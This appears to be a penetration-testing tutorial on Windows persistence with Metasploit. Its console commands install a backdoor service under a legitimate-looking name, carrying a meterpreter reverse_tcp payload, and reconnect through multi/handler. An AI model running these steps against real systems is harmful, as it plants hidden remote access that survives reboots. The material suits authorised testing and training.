# Establishing Persistence on Windows

Persistence = techniques used by adversaries to **maintain access** even after:  
- Restarts  
- Credential changes  
- Disconnections  

Getting initial access is not enough. For **long-term control**, persistence is key.

---

## Steps to Persistence

### 1. Initial Exploitation
- Exploit a vulnerable service running on the target machine.  
- Get a **meterpreter session**.  
- Perform privilege escalation until you gain **Administrator-level access**.  
  - Persistence modules usually require **admin rights** to install services or modify registry.  

```bash
> getuid                 # confirm privileges
> background             # send session to background
```


### 2. Search for Persistence Modules

```bash
meterpreter > search platform:windows persistence
```

* Example useful modules:

  * `exploit/windows/local/persistence_service` (most useful)
  * `exploit/windows/local/registry_persistence`
  * `post/windows/manage/persistence_exe`

---

### 3. Why `persistence_service` is Most Useful?

* Installs a malicious service that runs automatically at startup.
* Services are **hard to detect** (especially if given a legitimate-looking name).
* Survives reboots and user logouts.
* Runs with SYSTEM privileges if installed by an Administrator.

---

### 4. Configure the Module

```bash
use exploit/windows/local/persistence_service
set payload windows/x64/meterpreter/reverse_tcp
show options
set SERVICE_NAME "WindowsUpdateHelper"   # Make name look legit!
set session 1
```

* **Important:**
  Use the correct payload architecture (**x86 or x64**) depending on target system.

---

### 5. Deploy Persistence

```bash
exploit
```

* This will install the service and bind it to our payload.

---

### 6. Kill Current Session (Demo)

```bash
sessions -K
```

* Simulates a disconnect/loss of access.

---

### 7. Reconnect with Multi/Handler

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <same as before>
set LPORT <same as before>
run
```

⚠️ **VERY IMPORTANT:** LHOST and LPORT must match exactly the values used when installing persistence service. If not, the backdoor will fail.

---

### 8. Persistence Confirmed

* Even after killing sessions or restarting msfconsole, you can always reconnect by re-running the multi/handler with the same payload, LHOST, and LPORT.
* This ensures **long-term access** without re-exploiting the system.

---

